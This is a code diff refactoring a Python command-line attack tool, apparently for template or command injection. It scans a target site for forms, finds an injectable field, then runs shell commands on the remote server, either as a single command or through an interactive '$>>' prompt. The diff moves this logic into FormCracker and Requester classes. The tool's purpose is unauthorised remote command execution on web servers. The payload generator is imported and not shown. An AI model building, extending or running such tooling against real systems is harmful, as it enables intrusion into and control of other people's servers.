@@ -2,9 +2,10 @@ import logging
 from urllib.parse import urlparse
 from traceback import print_exc
 
-from .test_form import test_form, Form, submit_form_input
-from .request import common_request
+from .form import Form
+from .form_cracker import FormCracker
 from .scan_url import yield_form
+from .requester import Requester
 import click
 
 logging.basicConfig(level=logging.INFO)
@@ -17,6 +18,8 @@ def interact(cmd_exec):
         try:
             cmd = input("$>> ")
         except EOFError:
+            break
+        except KeyboardInterrupt:
             break
         try:
             result = cmd_exec(cmd)
@@ -39,20 +42,25 @@ def main():
 def crack(url, action, method, inputs, exec_cmd):
     assert all(param is not None for param in [
                url, inputs]), "Please check your param"
-    if action is None:
-        action = urlparse(url)[3]
     form = Form(
-        action=action,
+        action=action or urlparse(url)[3],
         method=method,
         inputs=inputs.split(",")
     )
-    payload_gen, field = test_form(url, form)
-    if payload_gen is None:
+    cracker = FormCracker(url=url, form=form)
+    result = cracker.crack()
+    if result is None:
         logger.warning("Test form failed...")
         return
+    payload_gen, field = result
 
-    cmd_exec_func = lambda cmd : submit_form_input(
-            url, form, {field: payload_gen(cmd)}).text
+    # payload_gen, field = test_form(url, form)
+    # if payload_gen is None:
+    #     logger.warning("Test form failed...")
+    #     return
+
+    def cmd_exec_func(cmd): return cracker.submit(
+        {field: payload_gen(cmd)}).text
     if exec_cmd == "":
         interact(cmd_exec_func)
     else:
@@ -64,19 +72,25 @@ def crack(url, action, method, inputs, exec_cmd):
 @click.option("--url", help="需要扫描的URL")
 @click.option("--exec-cmd", default="", help="成功后执行的shell指令，不填则进入交互模式")
 def scan(url, exec_cmd):
-    for page_url, forms in yield_form(url):
+    requester = Requester()
+    for page_url, forms in yield_form(requester, url):
         for form in forms:
-            payload_gen, field = test_form(page_url, form)
-            if payload_gen is None:
+            cracker = FormCracker(url=url, form=form, requester=requester)
+            result = cracker.crack()
+            if result is None:
                 continue
-            cmd_exec_func = lambda cmd : submit_form_input(
-                    url, form, {field: payload_gen(cmd)}).text
+            payload_gen, field = result
+
+            def cmd_exec_func(cmd):
+                return cracker.submit(
+                    {field: payload_gen(cmd)}).text
             if exec_cmd == "":
                 interact(cmd_exec_func)
             else:
                 print(cmd_exec_func(exec_cmd))
             return
     logger.warning("Scan failed...")
+
 
 if __name__ == '__main__':
     main()
